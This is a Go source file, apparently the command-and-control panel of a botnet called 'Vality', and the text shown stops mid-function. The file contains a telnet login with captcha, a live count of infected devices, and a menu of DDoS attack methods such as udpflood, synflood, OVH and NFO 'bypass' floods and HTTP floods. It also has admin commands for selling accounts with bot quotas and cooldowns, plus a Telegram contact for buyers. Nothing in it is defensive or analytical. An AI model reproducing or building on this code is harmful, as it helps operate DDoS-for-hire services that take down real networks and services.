package main

import (
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()
	/*
		╔═══════════════════════════════════════════════╗
		║                                               ║
		║                                               ║
		╚═══════════════════════════════════════════════╝
	*/

	var code int
	code = (rand.Intn(9)+1)*1000 + (rand.Intn(9)+1)*100 + (rand.Intn(9)+1)*10 + rand.Intn(10)
	this.conn.Write([]byte(fmt.Sprintf("\033]0; vality | Human Verification | " + strconv.Itoa(code) + "\007")))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦                 \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝                 \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩                  \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║         Please enter the\033[97m Captcha Code          ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║                Its in th\033[97me title.               ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.SetDeadline(time.Now().Add(20 * time.Second))
	this.conn.Write([]byte("\033[36mCaptcha\033[97m» \033[36m"))
	pin, err := this.ReadLine(false)
	this.conn.Write([]byte("\033[0m\r\n"))

	if err != nil || len(pin) != 4 {
		this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	cc, err := strconv.Atoi(pin)
	if err != nil || cc != code {
		this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033]0; vality | Enter Username\007")))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦                 \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝                 \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩                  \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║               Welcome to\033[97m Vality                ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║           Please enter y\033[97mour username.          ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[36mUsername\033[97m» \033[36m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\033]0; vality | Enter Password\007")))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                      \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦                 \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝                 \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩                  \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║               Welcome to\033[97m Vality                ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║           Please enter y\033[97mour password.          ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
	this.conn.Write([]byte("\033[36mPassword\033[97m» \033[36m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))

	var loggedIn bool
	var userInfo AccountInfo

	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(fmt.Sprintf("\033]0; vality | Invalid Credentials! \007")))

		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[36m                                      \r\n"))
		this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦                 \r\n"))
		this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝                 \r\n"))
		this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩                  \r\n"))
		this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
		this.conn.Write([]byte("\033[36m                ║              Invalid Cre\033[97mdentials               ║ \r\n"))
		this.conn.Write([]byte("\033[36m                ║        Contact @ecstasyc\033[97mode on Telegram        ║ \r\n"))
		this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
		this.conn.Write([]byte("\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\033]0; vality | Loading\007")))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦             \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝             \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩              \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Setting up your session.\033[97m..                [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Clearing cache...       \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Closing background procc\033[97messes...          [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Securing connection...  \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Loading terminal...     \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦             \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝             \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩              \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Setting up your session.\033[97m..                [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Clearing cache...       \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Closing background procc\033[97messes...          [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Securing connection...  \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Loading terminal...     \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦             \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝             \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩              \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Setting up your session.\033[97m..                [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Clearing cache...       \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Closing background procc\033[97messes...          [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Securing connection...  \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Loading terminal...     \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))

	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦             \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝             \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩              \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Setting up your session.\033[97m..                [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Clearing cache...       \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Closing background procc\033[97messes...          [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Securing connection...  \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Loading terminal...     \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))

	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦             \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝             \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩              \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Setting up your session.\033[97m..                [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Clearing cache...       \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Closing background procc\033[97messes...          [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Securing connection...  \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Loading terminal...     \033[97m                  [[31mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))

	time.Sleep(500 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                  \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦             \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝             \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩              \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Setting up your session.\033[97m..                [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Clearing cache...       \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Closing background procc\033[97messes...          [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Securing connection...  \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║ Loading terminal...     \033[97m                  [[32mOK\033[97m] ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
	time.Sleep(1000 * time.Millisecond)

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;[%d] Devices | vality | "+username+"\007", BotCount))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	/* ═══════════════ SESSION ═══════════════*/
	var session = &session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     this.conn,
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	/* ═══════════════ SESSION END ═══════════════*/

	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[36m                                      \r\n"))
	this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦                 \r\n"))
	this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝                 \r\n"))
	this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩                  \r\n"))
	this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
	this.conn.Write([]byte("\033[36m                ║               Welcome to\033[97m Vality                ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ║            Type 'help' t\033[97mo for Help.            ║ \r\n"))
	this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))

	for {
		var botCatagory string
		var botCount int
		// катигула
		/* ═══════════════ HANDLE ═══════════════*/

		this.conn.Write([]byte("\033[36m" + username + "\033[97m@\033[36mvality \033[97m» \033[36m"))
		cmd, err := this.ReadLine(false)

		/* ═══════════════ HANDLE ═══════════════*/

		/* ═══════════════ COMMANDS ═══════════════*/

		if err != nil || cmd == "clear" || cmd == "cls" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                                  \r\n"))
			this.conn.Write([]byte("\033[36m                           ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦                 \r\n"))
			this.conn.Write([]byte("\033[36m                           ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝                 \r\n"))
			this.conn.Write([]byte("\033[36m                            ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩                  \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════════════════════════\033[97m═══════════════════════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║               Welcome to\033[97m Vality                ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║            Type 'help' t\033[97mo for Help.            ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
			continue
		}

		if err != nil || cmd == "help" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                      ╔═══════════════════\033[97m═════════════════╗            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║     ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩      ║            \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════╚═══════════════════\033[97m═════════════════╝═════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ attack - SHOWS NET ATTAC\033[97mK MENUS                ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ status - SHOWS NET STAUT\033[97mS                      ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ rules - SHOWS TERMS OF S\033[97mERVICE                 ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ extrahelp - SHOWS ADMIN \033[97mCOMMANDS               ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ exit - CLOSE THE TERMINA\033[97mL                      ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ clear - CLEARS THE TERMI\033[97mNAL                    ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
			continue
		}

		if err != nil || cmd == "attack" || cmd == "ATTACK" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                      ╔═══════════════════\033[97m═════════════════╗            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║     ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩      ║            \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════╚═══════════════════\033[97m═════════════════╝═════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ udpflood [ip] [time] dpo\033[97mrt=[port] size=[size]  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ rawflood [ip] [time] dpo\033[97mrt=[port] size=[size]  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ synflood [ip] [time] dpo\033[97mrt=[port] size=[size]  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ hexflood [ip] [time] dpo\033[97mrt=[port] size=[size]  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ ackflood [ip] [time] dpo\033[97mrt=[port] size=[size]  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ udpplain [ip] [time] dpo\033[97mrt=[port] size=[size]  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ tcpbypass [ip] [time] dp\033[97mort=[port] size=[size] ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ udpbypass [ip] [time] dp\033[97mort=[port] size=[size] ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ nfobypass [ip] [time] dp\033[97mort=[port]             ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ ovhbypass [ip] [time] dp\033[97mort=[port]             ║ \r\n"))
		    this.conn.Write([]byte("\033[36m                ║ http [ip] [time] domain=\033[97m[port] conns=[size]    ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
			continue
		}
       
       if err != nil || cmd == "slut" || cmd == "SLUT" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                      ╔═══════════════════\033[97m═════════════════╗            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║     ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩      ║            \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════╚═══════════════════\033[97m═════════════════╝═════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ vse [ip] [time] dpo\033[97mrt=[port]                   ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
			continue
		}

		if err != nil || cmd == "LOGOUT" || cmd == "logout" || cmd == "EXIT" || cmd == "exit" {
			return
		}

		/*

			╔═══════════════════════════════════════════════╗
			║                                               ║
			║                                               ║
			╚═══════════════════════════════════════════════╝
		*/
		if err != nil || cmd == "extrahelp" || cmd == "EXTRAHELP" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                      ╔═══════════════════\033[97m═════════════════╗            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╦  ╦  ╔═╗  ╦   \033[97m ╦  ╔╦╗  ╦ ╦     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╚╗╔╝  ╠═╣  ║   \033[97m ║   ║   ╚╦╝     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║     ╚╝   ╩ ╩  ╩═╝ \033[97m ╩   ╩    ╩      ║            \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════╚═══════════════════\033[97m═════════════════╝═════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ /removeuser - REMOVES A \033[97mUSER                   ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ /users - SHOWS ALL ONLIN\033[97mE USER                 ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ /addbasic - ADDS A BASIC\033[97m ACCOUNT               ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ /addadmin - ADDS A ADMIN\033[97m ACCOUNT               ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚═════════════════════════\033[97m═══════════════════════╝ \r\n"))
			continue
		}

		if err != nil || cmd == "rules" || cmd == "RULES" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                      ╔══════════════════\033[97m══════════════════╗            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╦  ╦  ╔═╗  ╦  \033[97m  ╦  ╔╦╗  ╦ ╦     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╚╗╔╝  ╠═╣  ║  \033[97m  ║   ║   ╚╦╝     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║     ╚╝   ╩ ╩  ╩═╝\033[97m  ╩   ╩    ╩      ║            \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════╚══════════════════\033[97m══════════════════╝═════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Don't attack Goverment \033[97mIPs/Website's           ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Don't abuse attack time\033[97m.                       ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Don't share the NET IP/\033[97mDomain                  ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Do not share your Accou\033[97mnt!                     ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ No attack spam         \033[97m                        ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚════════════════════════\033[97m════════════════════════╝ \r\n"))
			continue
		}

		if err != nil || cmd == "status" || cmd == "STATUS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[36m                      ╔══════════════════\033[97m══════════════════╗            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╦  ╦  ╔═╗  ╦  \033[97m  ╦  ╔╦╗  ╦ ╦     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║    ╚╗╔╝  ╠═╣  ║  \033[97m  ║   ║   ╚╦╝     ║            \r\n"))
			this.conn.Write([]byte("\033[36m                      ║     ╚╝   ╩ ╩  ╩═╝\033[97m  ╩   ╩    ╩      ║            \r\n"))
			this.conn.Write([]byte("\033[36m                ╔═════╚══════════════════\033[97m══════════════════╝═════╗ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Auth Servers           \033[97m               [[32mONLINE\033[97m] ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Database               \033[97m               [[32mONLINE\033[97m] ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ Botnet Server          \033[97m               [[32mONLINE\033[97m] ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ║ OVH Proxy              \033[97m               [[32mONLINE\033[97m] ║ \r\n"))
			this.conn.Write([]byte("\033[36m                ╚════════════════════════\033[97m════════════════════════╝ \r\n"))
			continue
		}

		if err != nil || cmd == "/users" || cmd == "/USERS" {
			if userInfo.admin == 0 {
				fmt.Fprint(this.conn, "\033[91mYou don't have the permission to execute this Command!\r\n")
				continue
			}
			for _, s := range sessions {
				line := fmt.Sprintf("%d, %s, %s", s.ID, s.Username, s.Conn.RemoteAddr())
				fmt.Fprintf(this.conn, "\033[94m%s\r\n", (line))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[36m%s[37m: \033[36m%d\r\n", k, v)))
			}
			continue
		}

		if cmd == "" {
			continue
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("/addbasic") {
			this.conn.Write([]byte("[37mUsername\033[36m: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("[37mPassword\033[36m: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("[37m-1 for FULL NETWORK \r\n"))
			this.conn.Write([]byte("[37mAllowed Bots\033[36m: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("[37m0 for INFINITE time. \r\n"))
			this.conn.Write([]byte("[37mAllowed Duration\033[36m: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("[37m0 for no cooldown. \r\n"))
			this.conn.Write([]byte("[37mCooldown\033[36m: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("[37mUsername\033[36m: " + new_un + "\r\n"))
			this.conn.Write([]byte("[37mPassword\033[36m: " + new_pw + "\r\n"))
			this.conn.Write([]byte("[37mDuration\033[36m: " + duration_str + "\r\n"))
			this.conn.Write([]byte("[37mCooldown\033[36m: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("[37mNetwork\033[36m: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("[37mConfirm\033[36m: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[36mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[36mUser created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("addadmin") {
			this.conn.Write([]byte("[37mUsername\033[36m: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("[37mPassword\033[36m: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("[37m-1 for FULL NETWORK \r\n"))
			this.conn.Write([]byte("[37mAllowed Bots\033[36m: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("[37m0 for INFINITE time. \r\n"))
			this.conn.Write([]byte("[37mAllowed Duration\033[36m: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("[37m0 for no cooldown. \r\n"))
			this.conn.Write([]byte("[37mCooldown\033[36m: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
